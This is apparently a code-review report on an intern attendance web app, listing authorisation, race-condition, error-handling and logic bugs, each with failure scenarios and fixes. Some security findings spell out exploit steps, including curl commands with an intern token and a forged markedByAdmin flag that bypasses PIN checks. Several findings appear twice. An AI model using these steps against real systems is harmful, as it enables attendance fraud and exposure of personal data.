**What's wrong:** faceAttendanceRoutes.js only applies `authenticateUser` (line 18) — no `requireAdmin` / `requirePermission`. It then exposes GET /meeting-pin (line 25) and POST /meeting-pin/stop (line 27), mounted at /api/face-attendance (backend/app.js:65). `getCurrentMeetingPin` returns the live 6-digit PIN in the response body, and `?rotate=true` calls `activatePin()` which invalidates the PIN the admin currently has on screen. `stopCurrentMeetingPin` calls `rotatePin()`. So any intern holding a normal JWT can read, rotate, or kill the meeting PIN for any project name. This is the PIN that the whole meeting-attendance flow (AdminFaceAttendance meeting mode + intern FaceAttendance.jsx) is built around. The 404-fallback in adminApi.getFaceMeetingPin (frontend/src/api/adminApi.js:422-427) points at exactly this unprotected route.

**Failure:** An intern sitting at home runs `GET /api/face-attendance/meeting-pin?projectName=Weekly%20Standup` with their own login token and gets back `{"pin":"482913", "meetingSessionId":...}`. They then POST /api/face-attendance/scan with that PIN and are marked present for a meeting they never attended. Worse, `GET /api/face-attendance/meeting-pin?projectName=Weekly%20Standup&rotate=true` regenerates the PIN, so every other intern scanning with the code displayed on the admin's screen gets "Invalid or expired face attendance PIN."

**Evidence:**
```
faceAttendanceRoutes.js:18 `router.use(authenticateUser);`  … :25 `router.get("/meeting-pin", getCurrentMeetingPin);`  :27 `router.post("/meeting-pin/stop", stopCurrentMeetingPin);`
faceAttendanceController.js:316-322 `const { projectName, meetingTitle, rotate } = req.query; const pinData = FaceMeetingPinService.getCurrentPin(projectName || meetingTitle, Date.now(), { rotate: rotate === "true" });`
faceMeetingPinService.js:101 `pin: buildPin(normalizedName, state.issuedAt, state.version),`
app.js:65 `app.use("/api/face-attendance", faceAttendanceRoutes);` (and :66 `app.use("/api/face", faceAttendanceRoutes);` — same hole on a second prefix)
```

**Fix:** Remove /meeting-pin, /meeting-pin/stop (and the `rotate` query option) from the intern-facing router; keep them only on adminRoutes behind requireAdmin + requirePermission("attendance.manage"). Leave only /meeting-pin/validate for interns.

## [CRITICAL] Client-supplied metadata.markedByAdmin lets an intern bypass meeting-PIN validation entirely
`backend/controllers/faceAttendanceController.js:89` · *permissions-auth*

**What's wrong:** `verifyFaceAttendance` (the intern-facing POST /api/face-attendance/scan) takes `metadata` straight from `req.body` and forwards it unfiltered to `FaceAttendanceService.markAttendanceWithFace`. That service decides whether to skip PIN checking with `bypassValidation: metadata.markedByAdmin === true`. The admin controller `scanInternFaceByAdmin` sets that flag server-side (line 398), but nothing strips or rejects it on the intern path, so the flag is fully attacker-controlled.

**Failure:** An intern POSTs `/api/face-attendance/scan` with `{descriptor: <their own face>, attendanceType: "meeting", meetingTitle: "Weekly Standup", metadata: {markedByAdmin: true}}`. `validatePin` takes the `bypassValidation` branch (faceMeetingPinService.js:111-119), returns a session id without ever comparing a PIN, and meeting attendance is recorded — no PIN, no admin, no meeting.

**Evidence:**
```
faceAttendanceController.js:59-68 `const { descriptor, metadata = {}, ... } = req.body;` then :86-97 `FaceAttendanceService.markAttendanceWithFace({ descriptor, source: metadata.source || "browser-camera", metadata, ... })`
faceAttendanceService.js:219-223 `meetingPinData = FaceMeetingPinService.validatePin({ projectName: normalizedProjectName, pin: meetingPin || metadata.meetingPin, bypassValidation: metadata.markedByAdmin === true });`
faceMeetingPinService.js:111 `if (bypassValidation) { ... return { meetingSessionId: state?.sessionId || crypto.randomUUID(), ... } }`
```

**Fix:** In verifyFaceAttendance, sanitise the incoming metadata (`delete metadata.markedByAdmin; delete metadata.adminId;`) or whitelist the allowed keys; better, make markAttendanceWithFace take an explicit `bypassPin` argument that only the admin controller can pass, instead of reading it out of user-supplied metadata.

## [CRITICAL] Client-supplied metadata.markedByAdmin bypasses meeting-PIN validation on the intern scan endpoint
`backend/controllers/faceAttendanceController.js:86` · *permissions-auth*

**What's wrong:** `verifyFaceAttendance` (intern-facing `POST /api/face-attendance/scan`) destructures `metadata` straight out of `req.body` (line 60) and forwards it unfiltered to `FaceAttendanceService.markAttendanceWithFace` (line 86). That service decides whether to skip PIN checking with `bypassValidation: metadata.markedByAdmin === true` (faceAttendanceService.js:222). The admin controller `scanInternFaceByAdmin` sets that flag server-side (line 398) — which is why AdminFaceAttendance's meeting mode works without ever sending a PIN — but nothing strips or rejects the flag on the intern path, so it is fully attacker-controlled.

**Failure:** An intern POSTs `/api/face-attendance/scan` with `{descriptor: <their own face>, attendanceType: "meeting", meetingTitle: "Weekly Standup", metadata: {markedByAdmin: true}}`. `validatePin` takes the bypass branch, returns a session id without comparing any PIN, and meeting attendance is written — no PIN, no admin, no meeting attended.

**Evidence:**
```
faceAttendanceController.js:59-68 `const { descriptor, metadata = {}, ... } = req.body;` → :86-97 `FaceAttendanceService.markAttendanceWithFace({ descriptor, source: metadata.source || "browser-camera", metadata, ... })`
faceAttendanceService.js:218-223 `meetingPinData = FaceMeetingPinService.validatePin({ projectName: normalizedProjectName, pin: meetingPin || metadata.meetingPin, bypassValidation: metadata.markedByAdmin === true });`
faceMeetingPinService.js:111-119 `if (bypassValidation) { const state = ...; return { meetingSessionId: state?.sessionId || crypto.randomUUID(), ... }; }`
```

**Fix:** Sanitise incoming metadata in verifyFaceAttendance (`delete metadata.markedByAdmin; delete metadata.adminId;`) or whitelist allowed keys. Better: give markAttendanceWithFace an explicit `bypassPin` parameter that only scanInternFaceByAdmin passes, instead of reading trust from user-supplied metadata.

## [HIGH] Daily mode can never record a check-out — attendanceAction is never sent, so the backend always treats it as check_in
`frontend/src/pages/AdminFaceAttendance.jsx:641` · *api-contract-mismatch*

**What's wrong:** The scan payload omits `attendanceAction` entirely. `scanInternFaceByAdmin` defaults it to `"check_in"` (faceAttendanceController.js:380), which flows into `markDailyAttendance` → `evaluateDailyAttendanceAction`. With an existing un-checked-out entry for today, action `check_in` always returns `{operation:"reject", code:"ALREADY_CHECKED_IN"}`. So `result.checkedOut` can never be true from this page, making the `response.checkedOut` branch at line 650 dead code, and there is no Check In / Check Out selector anywhere in the UI. The intern-facing pages do this correctly (frontend/src/pages/FaceAttendance.jsx:675-676 sends `attendanceAction` from useDailyAttendanceStatus).

**Failure:** Intern checked in with their own face at 09:00. At 17:00 they ask the admin to check them out at the desk. Admin selects Daily mode, picks the intern, scans their face → toast reads "You are already checked in. Select Check Out when leaving." There is no such control on this page, so the check-out can never be recorded and the intern's day shows no checkOutTime.

**Evidence:**
```
AdminFaceAttendance.jsx:638-648 `await adminFaceApi.scanIntern({ internId: selectedIntern._id, descriptor: frameData.descriptor, attendanceType: mode, meetingTitle: ..., metadata: {...} })` — no attendanceAction.
faceAttendanceController.js:380 `attendanceAction = "check_in",`
backend/utils/attendancePolicy.js:39-46 `if (normalizedAction === "check_in") { return { operation: "reject", code: "ALREADY_CHECKED_IN", message: "You are already checked in. Select Check Out when leaving.", alreadyMarked: true }; }`
AdminFaceAttendance.jsx:650 `const successMessage = response.checkedOut ? \`Check-out recorded for ...\`` (unreachable)
```

**Fix:** Add a Check In / Check Out toggle for daily mode (or send `attendanceAction: "auto"`) and pass it in the scanIntern payload; ideally fetch the intern's current daily status first so the toggle defaults correctly.

## [HIGH] Typing in the search box while the camera runs nulls selectedIntern, crashing enroll/mark with a raw TypeError
`frontend/src/pages/AdminFaceAttendance.jsx:788` · *crash*

**What's wrong:** The search input's onChange clears `selectedIntern` (`if (selectedIntern) setSelectedIntern(null)`) but does not stop the camera or reset the flow. The sidebar stays fully interactive while the camera is active. `completeEnrollment` (line 599) and `handleMarkAttendance` (line 639) then dereference `selectedIntern._id` with no null guard. Because those lines sit inside the try block, the TypeError is caught and surfaced verbatim by `toast.error(err.message)`.

**Failure:** Admin selects intern, switches to Enrol, clicks Start Camera, then edits the search box while the 5 samples are being captured (very natural — they want to line up the next intern). When the 5th sample lands, completeEnrollment runs and the admin sees the toast "Cannot read properties of null (reading '_id')". Nothing is saved and the 10-second capture is wasted. Same in Daily/Meeting mode: Mark Attendance shows that TypeError instead of marking anyone.

**Evidence:**
```
AdminFaceAttendance.jsx:786-789 `onChange={(e) => { handleSearch(e.target.value); if (selectedIntern) setSelectedIntern(null); }}` (no stopCamera)
:599 `internId: selectedIntern._id,`  :639 `internId: selectedIntern._id,`  :604 `\`Face enrolled successfully for ${selectedIntern.Trainee_Name}\``
```

**Fix:** Call stopCamera() (and reset enrollmentFrames) when the selection is cleared, or disable the search input while cameraActive; and add an explicit `if (!selectedIntern) { toast.error("Select an intern first."); return; }` guard at the top of completeEnrollment and handleMarkAttendance.

## [HIGH] Failed enrollment leaves the intern's face profile wiped/partial while the UI reports total failure
`frontend/src/pages/AdminFaceAttendance.jsx:597` · *data-integrity*

**What's wrong:** completeEnrollment sends the 5 descriptors as 5 separate sequential POSTs, with `replaceExisting: index === 0`. On the backend, `replaceExisting === true` immediately clears `profile.embeddings` and `sampleCount` and saves. There is no transaction and no rollback: if any of requests 2-5 fails, the previously enrolled samples are already gone and the profile is left with fewer samples than before, yet the only feedback is `toast.error("Enrollment failed.")`, which implies nothing changed.

**Failure:** Intern already has 5 good embeddings. Admin re-enrols them; POST #1 wipes the 5 embeddings and stores 1 new one; POST #2 fails (token expiry / network blip / 500). The loop aborts, toast says "Enrollment failed.", the admin retries later or moves on. The intern's profile now holds a single embedding taken at one head angle, so their real check-ins start failing with "Face did not match your registered profile", and there is no UI signal that the profile was degraded.

**Evidence:**
```
AdminFaceAttendance.jsx:597-603 `for (const [index, descriptor] of enrollmentFrames.entries()) { await adminFaceApi.enrollIntern({ internId: selectedIntern._id, descriptor, metadata: { replaceExisting: index === 0 } }); }`
backend/services/faceAttendanceService.js:82-85 `if (metadata.replaceExisting === true) { profile.embeddings = []; profile.sampleCount = 0; }` followed by `await profile.save();` on every call
```

**Fix:** Send all 5 descriptors in one request (accept `descriptors: [...]` in registerFaceProfileByAdmin and replace atomically), or keep a copy of the old embeddings and restore them if any request in the loop fails.

## [MEDIUM] Meeting scan always reports dailyAttendanceMarked:false — ReferenceError swallowed by an empty catch
`backend/services/attendanceWorkflowService.js:648` · *error-handling*

**What's wrong:** `markMeetingAttendance` reads `result.dailyAttendanceMarked` but `result` is never declared anywhere in the module (grep for `\bresult\b` in this file returns only line 648). Reading an undeclared identifier throws ReferenceError unconditionally, and the surrounding catch block is empty, so `dailyAttendanceMarked` is permanently false. The daily attendance write itself has already succeeded at that point, so the DB is right and the API response is wrong. This is exactly the field the admin page's success toast depends on.

**Failure:** Admin marks meeting attendance for an intern who has not checked in today. markDailyAttendance succeeds and the daily entry is written, then line 648 throws ReferenceError, the empty catch swallows it, and the controller returns dailyAttendanceMarked:false. The admin sees "Face meeting attendance marked successfully." instead of "...Daily attendance also recorded.", so they go and mark daily attendance again, which then errors with ALREADY_CHECKED_IN and looks like a broken system.

**Evidence:**
```
attendanceWorkflowService.js:640-651 `await markDailyAttendance({ internId, ... allowCheckout: false }); dailyAttendanceMarked = Boolean(result.dailyAttendanceMarked); } catch (error) { /* comment only */ }`
faceAttendanceController.js:443-446 message selection depends on `result.dailyAttendanceMarked`
AdminFaceAttendance.jsx:654 `: response.message || "Attendance marked."`
```

**Fix:** `const dailyResult = await markDailyAttendance({...}); dailyAttendanceMarked = Boolean(dailyResult.dailyAttendanceMarked);` and log the swallowed error instead of an empty catch.

## [MEDIUM] No permission gate on the page or its route — supervisors reach it and only hit 403 after the whole capture flow
`frontend/src/routes/AppRoutes.jsx:192` · *permissions-auth*

**What's wrong:** /admin/face-attendance is wrapped only by AdminRoute, which checks that a token and a role exist and nothing else. The page itself never calls hasAdminPermission. AdminNavigation hides the "Face ID" link behind `attendance.manage`, but the URL is reachable directly. All of the page's GETs (settings, profiles, intern search) map to `attendance.view` in enforceRoutePermission, which supervisors have, so the page renders and works right up to the mutating POST, which requires `attendance.manage`.

**Failure:** A supervisor (role permissions: dashboard.view, interns.view, daily_logs.view, attendance.view, leave.view) opens /admin/face-attendance directly. Intern search works, the profiles modal loads fully, the camera starts and captures all 5 enrollment samples — then the very first enroll POST returns 403 and the toast reads "Permission required: attendance.manage". Same for Mark Attendance: location prompt, face capture, then 403.

**Evidence:**
```
AppRoutes.jsx:192 `<Route path="/admin/face-attendance" element={<AdminFaceAttendance />} />` inside `<Route element={<AdminRoute />}>`
AdminRoute.jsx:7 `if (!session?.token || !session?.user?.role) { ... }` — no permission check
AdminNavigation.jsx:49 `{ to: "/admin/face-attendance", label: "Face ID", ..., permission: "attendance.manage" }`
backend/middleware/adminAuth.js:33-34 `if (path.startsWith("/attendance") || path.startsWith("/face-attendance") ...) return req.method === "GET" ? "attendance.view" : "attendance.manage";`
backend/config/adminPermissions.js:12-15 supervisor has attendance.view but not attendance.manage
```

**Fix:** Guard the route with a permission-aware wrapper (or add an early `if (!hasAdminPermission("attendance.manage")) return <AccessDenied/>` in AdminFaceAttendance) so the page matches the nav-item permission.

## [MEDIUM] Intern search has no request cancellation — a slow earlier response overwrites newer results
`frontend/src/pages/AdminFaceAttendance.jsx:307` · *race-condition*

**What's wrong:** handleSearch debounces the *start* of the request but nothing cancels or sequence-checks an already-issued fetch. Two searches can be in flight (the debounce only suppresses requests typed within 350 ms of each other); whichever resolves last wins `setSearchResults`, and the loser also flips `setSearchLoading(false)` early. There is also no AbortController and no cleanup of `searchDebounce.current` on unmount.

**Failure:** Admin types "kav", pauses ~400 ms so request A fires and is slow (2 s). They then type "TR2024-118"; request B fires and returns in 200 ms, showing the right intern. The admin has not clicked yet when request A lands and replaces the list with the "kav" matches at the same screen position — the admin clicks the row that just appeared under their cursor and enrols/marks the wrong intern's face.

**Evidence:**
```
AdminFaceAttendance.jsx:302-318 `if (searchDebounce.current) clearTimeout(searchDebounce.current); ... searchDebounce.current = setTimeout(async () => { setSearchLoading(true); try { const data = await adminFaceApi.searchIntern(query); setSearchResults(data.interns || []); } ... }, 350);` — no AbortController, no request-id guard, and no `useEffect(() => () => clearTimeout(searchDebounce.current), [])`.
```

**Fix:** Track a monotonically increasing request id (or use an AbortController stored in the ref) and ignore/abort responses that are not the latest; clear the debounce timer in an unmount cleanup.

## [MEDIUM] Camera stream leaks when the component unmounts (or Start Camera is double-clicked) while getUserMedia is pending
`frontend/src/pages/AdminFaceAttendance.jsx:371` · *react-effect-cleanup*

**What's wrong:** The unmount cleanup `useEffect(() => () => stopCamera(), [])` only stops whatever is in `streamRef.current` at that moment. `startCamera` awaits `requestFaceCameraStream()` and assigns the resolved stream to `streamRef.current` afterwards, with no check that the component is still mounted and no in-flight guard. The Start Camera button is disabled only on `!selectedIntern || loading`, and `loading` is not set by startCamera, so it can also be clicked twice and acquire two independent MediaStreams while only the second is retained in the ref.

**Failure:** Admin clicks Start Camera; the browser shows the permission prompt; the admin clicks another item in AdminNavigation and leaves the page; then approves the still-open prompt. The unmount cleanup already ran against a null streamRef, so the newly granted MediaStream is stored on a dead component and never stopped — the camera/recording indicator stays lit for the rest of the browser session. Same result from double-clicking Start Camera: two streams open, stopCamera stops only one, and the camera light stays on after the admin closes the scanner.

**Evidence:**
```
AdminFaceAttendance.jsx:296-298 `useEffect(() => { return () => stopCamera(); }, []);`
:370-378 `const stream = await requestFaceCameraStream(); streamRef.current = stream; ... setCameraActive(true);` (no mounted check, no in-flight flag)
:876-878 `<button onClick={startCamera} disabled={!selectedIntern || loading}>` (loading is never set by startCamera)
```

**Fix:** Keep an `isMountedRef`/`startingRef`; after the await, if unmounted or a stream already exists, immediately `stream.getTracks().forEach(t => t.stop())`; also disable the Start Camera button while the request is in flight.

## [MEDIUM] GET /admin/face-attendance/meeting-pin?rotate=true mutates PIN state but only requires the read permission attendance.view
`backend/middleware/adminAuth.js:34` · *permissions-auth*

**What's wrong:** enforceRoutePermission maps every /face-attendance path to `attendance.view` when the method is GET. But `getCurrentMeetingPin` accepts `rotate=true` and calls `activatePin()`, which bumps the version and issues a brand-new session id and PIN — a state-mutating operation gated behind a read-only permission. adminApi.getFaceMeetingPin exposes exactly this option (`options.rotate` → `rotate: "true"`).

**Failure:** A supervisor (attendance.view only, no attendance.manage) hits `GET /api/admin/face-attendance/meeting-pin?projectName=Weekly%20Standup&rotate=true`. It returns 200 and rotates the PIN. Every intern currently scanning against the code the admin has projected on screen now gets "Invalid or expired face attendance PIN." until the admin notices and regenerates.

**Evidence:**
```
adminAuth.js:33-34 `if (path.startsWith("/attendance") || path.startsWith("/face-attendance") || path.startsWith("/manual-attendance")) { return req.method === "GET" ? "attendance.view" : "attendance.manage"; }`
faceAttendanceController.js:318-321 `const { projectName, meetingTitle, rotate } = req.query; ... FaceMeetingPinService.getCurrentPin(..., { rotate: rotate === "true" });`
faceMeetingPinService.js:93-95 `const state = options.rotate ? activatePin(normalizedName, now) : getActivePinState(...)`
```

**Fix:** Attach `requirePermission("attendance.manage")` explicitly to the meeting-pin routes in adminRoutes.js (or move rotation to a POST /meeting-pin/rotate endpoint) instead of relying on the GET→view mapping.

## [MEDIUM] Page-level fetch helpers have no 401 handling and read the wrong error field, so an expired session shows a generic "Search failed"
`frontend/src/pages/AdminFaceAttendance.jsx:113` · *error-handling*

**What's wrong:** The local `adminFaceApi` helpers bypass adminApi's `checkAuth`, so 401 responses are never converted into a logout/redirect the way adminApi.getFaceEnrollmentProfiles does. On top of that, `searchIntern` reads `.error` from the error body, but the auth middlewares return `{ message, code }` (authMiddleware.js:8-11/21-29, adminAuth.js:7/24), so the real reason is dropped and the admin sees the fallback text. `(await res.json())` will also throw a SyntaxError if a proxy returns a non-JSON 502.

**Failure:** An admin leaves the Face ID page open past token expiry. Every search returns 401 `{"message":"Session expired. Please log in again.","code":"TOKEN_EXPIRED"}`, but the toast just says "Search failed" and the admin stays on the page retrying. Meanwhile clicking "Face Enrollment Profiles" (which goes through adminApi/checkAuth) does log them out — inconsistent and confusing. The same 401 during enrol/scan surfaces as "Session expired. Please log in again." in a toast but never actually logs them out.

**Evidence:**
```
AdminFaceAttendance.jsx:108-115 `const res = await fetch(...); if (!res.ok) throw new Error((await res.json()).error || "Search failed"); `
:117-137 enrollIntern / scanIntern — `if (!res.ok) throw new Error(data.message || ...)` with no 401 branch
compare frontend/src/api/adminApi.js:4-20 `checkAuth` → `handleUnauthorized(msg)`
backend/middleware/authMiddleware.js:20-25 returns `{ message: "Session expired. Please log in again.", code: "TOKEN_EXPIRED" }` (no `error` key)
```

**Fix:** Route these four calls through adminApi (or import and call the same checkAuth/handleUnauthorized helper), and read `body.message ?? body.error` with a try/catch around res.json().

## [MEDIUM] Profile status is derived from sampleCount > 0, so partial enrollments show "Ready" and the Incomplete/Inactive filters never match anything
`frontend/src/pages/AdminFaceAttendance.jsx:245` · *logic-error*

**What's wrong:** The modal's status badge and the filter dropdown rely on `profile.isComplete` / `profile.isActive`, which the backend computes as `isActive: profile.isActive !== false` and `isComplete: profile.isActive !== false && sampleCount > 0` — not against REQUIRED_ENROLLMENT_SAMPLES (5). Nothing anywhere in the backend ever writes `isActive: false` on an InternFaceProfile (the only writes are the schema default `true` and `profile.isActive = true` in registerFaceProfile), and registerFaceProfile always stores at least one embedding, so `isActive` and `isComplete` are true for every returned row.

**Failure:** A partially-failed enrollment leaves an intern with 1 of 5 embeddings. The admin opens the profiles modal and selects "Incomplete profiles" to find people who need re-enrolling — the table shows "No face enrollment profiles found." "Inactive profiles" is likewise always empty, and under "All profiles" that intern's Samples column reads 1 while the Status badge reads green "Ready", so the admin concludes everyone is fully enrolled.

**Evidence:**
```
AdminFaceAttendance.jsx:242-246 `profileFilter === 'complete' && profile.isComplete) || (profileFilter === 'incomplete' && profile.isActive && !profile.isComplete) || (profileFilter === 'inactive' && !profile.isActive)`
AdminFaceAttendance.jsx:1079-1087 badge: `profile.isComplete ? 'Ready' : profile.isActive ? 'Incomplete' : 'Inactive'`
backend/controllers/faceAttendanceController.js:272-274 `isActive: profile.isActive !== false, sampleCount, isComplete: profile.isActive !== false && sampleCount > 0,`
backend/services/faceAttendanceService.js:102 `profile.isActive = true;` (only write to isActive besides the schema default)
```

**Fix:** Compute completeness against the real enrollment target (`sampleCount >= 5`, matching REQUIRED_ENROLLMENT_SAMPLES) in getFaceProfileEnrollmentSummary, and either implement an inactive state or drop that filter option.

## [LOW] Dead error branch: no backend message ever contains "already out of office"
`frontend/src/pages/AdminFaceAttendance.jsx:660` · *logic-error*

**What's wrong:** The catch block conditionally calls stopCamera() when the error message contains "already out of office". That string exists nowhere in the backend (grep across the whole repo returns only this line). The real messages are "You have already checked out today.", "You are already checked in. Select Check Out when leaving.", "Already marked today attendance" and "Attendance for this project is already marked today.", so the branch never runs and the camera is left streaming after a terminal error.

**Failure:** Admin scans an intern who already checked out today. Backend returns 400 "You have already checked out today." The toast appears but the condition is false, so the camera keeps running and the face-guide interval keeps hammering face-api every 500 ms; the admin can press Mark Attendance repeatedly and get the same error forever.

**Evidence:**
```
AdminFaceAttendance.jsx:658-662 `catch (err) { toast.error(err.message || "Failed to verify face."); if (err.message && err.message.includes("already out of office")) { stopCamera(); } }`
backend/utils/attendancePolicy.js:32 `message: "You have already checked out today."`; :43 `"You are already checked in. Select Check Out when leaving."`
```

**Fix:** Match on the backend `code` field (ALREADY_CHECKED_OUT / ALREADY_CHECKED_IN / CHECKOUT_TOO_SOON), which the controller already returns, instead of an English substring — and propagate `code` through adminFaceApi.scanIntern's thrown error.

## [LOW] Mark Attendance button is not disabled while the mark is in flight (keyboard double-submit)
`frontend/src/pages/AdminFaceAttendance.jsx:943` · *race-condition*

**What's wrong:** The button's only disabled condition is `!faceGuide.ready`; `loading` is not included. The loading overlay blocks the mouse but not keyboard activation — the button keeps DOM focus after the first click, so Enter/Space fires handleMarkAttendance a second time while the first request is still running.

**Failure:** Admin clicks Mark Attendance and, seeing the "Processing..." spinner, taps Enter (the button still has focus). A second geolocation prompt fires and a second scan POST is sent. In meeting mode the second request returns "Attendance for this project is already marked today." so the admin gets a success toast immediately followed by an error toast for the same intern and cannot tell whether the record was saved.

**Evidence:**
```
AdminFaceAttendance.jsx:941-947 `<button onClick={handleMarkAttendance} disabled={!faceGuide.ready} ...>Mark Attendance</button>`
:613-614 `const handleMarkAttendance = async () => { setLoading(true);` (no in-flight guard)
```

**Fix:** `disabled={!faceGuide.ready || loading}` and/or an early `if (loading) return;` at the top of handleMarkAttendance.

## [LOW] Profile filters "Incomplete profiles" and "Inactive profiles" can never match any row
`frontend/src/pages/AdminFaceAttendance.jsx:244` · *logic-error*

**What's wrong:** `isComplete` is computed by the backend as `profile.isActive !== false && sampleCount > 0` and `isActive` as `profile.isActive !== false`. Nothing in the backend ever writes `isActive: false` on an InternFaceProfile (grep for InternFaceProfile shows only the model, the service and this controller, and registerFaceProfile always sets `isActive = true`), and registerFaceProfile always stores at least one embedding, so `sampleCount` is never 0. Therefore every returned profile has isComplete === true and the two filter options are permanently empty.

**Failure:** An admin trying to find interns whose enrollment needs to be redone selects "Incomplete profiles" (or "Inactive profiles") in the modal dropdown and always sees "No face enrollment profiles found.", concluding every intern is fully enrolled — even when a partially-failed enrollment left someone with a single sample.

**Evidence:**
```
AdminFaceAttendance.jsx:242-246 `profileFilter === 'complete' && profile.isComplete) || (profileFilter === 'incomplete' && profile.isActive && !profile.isComplete) || (profileFilter === 'inactive' && !profile.isActive)`
backend/controllers/faceAttendanceController.js:272-274 `isActive: profile.isActive !== false, sampleCount, isComplete: profile.isActive !== false && sampleCount > 0,`
backend/services/faceAttendanceService.js:102 `profile.isActive = true;` (the only write to isActive besides the schema default)
```

**Fix:** Define "complete" against the real enrollment target (e.g. `sampleCount >= 5`, matching REQUIRED_ENROLLMENT_SAMPLES) so partially enrolled interns are actually surfaced, and drop or implement the inactive state.

## [LOW] Failed profile load renders the empty state "No face enrollment profiles found." instead of an error state
`frontend/src/pages/AdminFaceAttendance.jsx:1049` · *error-handling*

**What's wrong:** fetchEnrollmentProfiles catches the error, shows a toast with a fixed id and leaves `enrollmentData` at its previous value (initially `{stats:{}, profiles:[]}`). The modal then renders the zero-results branch, which is indistinguishable from a genuinely empty dataset, and the stat tiles all show 0. There is no error state and no retry affordance beyond the Refresh button.

**Failure:** Backend returns 500 (or the admin is offline). The toast is short-lived and may be missed or deduped by its fixed id `face-enrollment-profiles-load`; the modal then shows Total Interns 0 / Enrolled 0 / Not Enrolled 0 and "No face enrollment profiles found." The admin reports that all face enrollments were deleted.

**Evidence:**
```
AdminFaceAttendance.jsx:214-226 catch → `toast.error(..., { id: 'face-enrollment-profiles-load' })` only
:1048-1051 `: filteredProfiles.length === 0 ? (<div ...>No face enrollment profiles found.</div>)`
:1006-1008 `value: enrollmentData.stats.totalInterns || 0` etc.
```

**Fix:** Store the error in state and render a distinct error panel with a Retry button when the last fetch failed, instead of falling through to the empty state.

## [LOW] Newly enrolled interns show an enrollment timestamp in the "Last Face Match" column instead of "Never"
`backend/services/faceAttendanceService.js:105` · *logic-error*

**What's wrong:** `registerFaceProfile` sets `profile.lastMatchedAt = new Date()` on every enrollment save, even though no face match occurred. `getFaceProfileEnrollmentSummary` returns that field as `lastMatchedAt`, and the profiles modal renders it in the "Last Face Match" column via `formatDateTime`, whose `'Never'` fallback therefore becomes unreachable for any enrolled intern.

**Failure:** Admin enrols a new intern at 10:00 and opens the Face Enrollment Profiles modal. The intern's "Last Face Match" reads "Aug 5, 2026, 10:00 AM" even though they have never scanned. The admin cannot use that column to find enrolled interns whose face recognition is never actually succeeding.

**Evidence:**
```
faceAttendanceService.js:105-106 `profile.lastMatchedAt = new Date(); await profile.save();` inside registerFaceProfile
faceAttendanceController.js:277 `lastMatchedAt: profile.lastMatchedAt,`
AdminFaceAttendance.jsx:1077 `<td ...>{formatDateTime(profile.lastMatchedAt)}</td>` with :250-258 `const formatDateTime = (value) => value ? ... : 'Never';`
```

**Fix:** Only set `lastMatchedAt` in markAttendanceWithFace (which already does so at line 325); in registerFaceProfile leave it untouched, or track enrollment time separately via the existing `updatedAt`.

## [LOW] Clearing the meeting title after the camera starts is never re-validated, producing a backend 400
`frontend/src/pages/AdminFaceAttendance.jsx:642` · *logic-error*

**What's wrong:** startCamera validates `meetingTitle.trim()` for meeting mode (line 363-368), but the meeting-title input stays mounted and editable while `cameraActive` is true, and handleMarkAttendance re-reads `meetingTitle.trim()` without re-validating it. An empty title is sent as `meetingTitle: ""`, and markAttendanceWithFace then rejects with a 400 because normalizedProjectName is empty.

**Failure:** Admin starts the camera in Meeting mode with title "Weekly Standup", then clears the field to start typing the next meeting's name while the intern is stepping up to the camera. Clicking Mark Attendance triggers the location prompt and the face capture, and only then shows "Project name is required for meeting attendance." — the whole capture is wasted.

**Evidence:**
```
AdminFaceAttendance.jsx:642 `meetingTitle: mode === "meeting" ? meetingTitle.trim() : undefined,`
:828-834 the meeting-title `<input>` is rendered whenever `mode === 'meeting'`, regardless of cameraActive
backend/services/faceAttendanceService.js:201-205 `if (normalizedAttendanceType === "meeting" && !normalizedProjectName) { const error = new Error("Project name is required for meeting attendance."); error.statusCode = 400; throw error; }`
```

**Fix:** Re-check `mode === "meeting" && !meetingTitle.trim()` at the top of handleMarkAttendance (and disable the Mark Attendance button when it is empty), or make the title read-only while the camera is active.

## [LOW] A failed profile load renders the "No face enrollment profiles found." empty state and zeroed stat tiles instead of an error state
`frontend/src/pages/AdminFaceAttendance.jsx:1048` · *error-handling*

**What's wrong:** fetchEnrollmentProfiles catches the error, shows a toast with a fixed id, and leaves `enrollmentData` at its previous value (initially `{stats:{}, profiles:[]}`). No error state is stored, so the modal falls through to the zero-results branch, which is indistinguishable from a genuinely empty dataset, and all three stat tiles render `|| 0`.

**Failure:** The profiles endpoint returns 500 (or the admin is briefly offline). The toast is short-lived and is deduped by its fixed id `face-enrollment-profiles-load` if it already fired; the modal then shows Total Interns 0 / Enrolled 0 / Not Enrolled 0 and "No face enrollment profiles found." The admin reports that all face enrollments were deleted.

**Evidence:**
```
AdminFaceAttendance.jsx:214-226 catch → `toast.error(error.message || 'Failed to load face enrollment profiles', { id: 'face-enrollment-profiles-load' })` only
:1048-1051 `: filteredProfiles.length === 0 ? (<div ...>No face enrollment profiles found.</div>)`
:1006-1008 `value: enrollmentData.stats.totalInterns || 0` / `enrollmentData.stats.enrolled || 0` / `enrollmentData.stats.notEnrolled || 0`
```

**Fix:** Store the failure in state and render a distinct error panel with a Retry button when the last fetch failed, instead of falling through to the empty state.

# AdminInactiveInterns — 24 findings

## [CRITICAL] Inactive-intern API has no admin/permission check — any logged-in intern can read archived PII and reactivate interns
`backend/routes/inactiveInternRoutes.js:8` · *permissions-auth*

**What's wrong:** inactiveInternRoutes.js mounts only `authMiddleware` (plain JWT verify, backend/middleware/authMiddleware.js:16) for every route on /api/inactive-interns. It never uses `requireAdmin` / `requirePermission` from backend/middleware/adminAuth.js. Intern logins are signed with the SAME secret (`dotenv.jwtSecret`) in backend/services/authService.js:120 and :150, so an intern's own token passes this middleware. That exposes GET /api/inactive-interns (full name/email/institute list of every archived intern), GET /api/inactive-interns/:id (adds Trainee_HomeAddress), GET /api/inactive-interns/:id/daily-records (another person's logbook), and the destructive POST /api/inactive-interns/:id/reactivate. On the frontend the page is equally ungated: AdminInactiveInterns.jsx has no `hasAdminPermission` call anywhere, and AppRoutes.jsx:188-191 wraps it only in AdminRoute (which checks token+role only, AdminRoute.jsx:7). AdminNavigation.jsx:56 hides the nav link behind `interns.manage`, so the permission is UI-only.

**Failure:** An intern logs into TalentHub normally, copies the JWT from localStorage, and runs `curl -H "Authorization: Bearer <intern token>" https://<api>/api/inactive-interns?limit=100` -> receives names, emails, institutes of all archived interns; a follow-up `curl -X POST .../api/inactive-interns/<id>/reactivate` restores an archived intern (and, per the deleteMany bug, can destroy an active Intern record). Separately, an admin whose role lacks `interns.manage` sees no nav link but can type /admin/inactive-interns and use every action successfully.

**Evidence:**
```
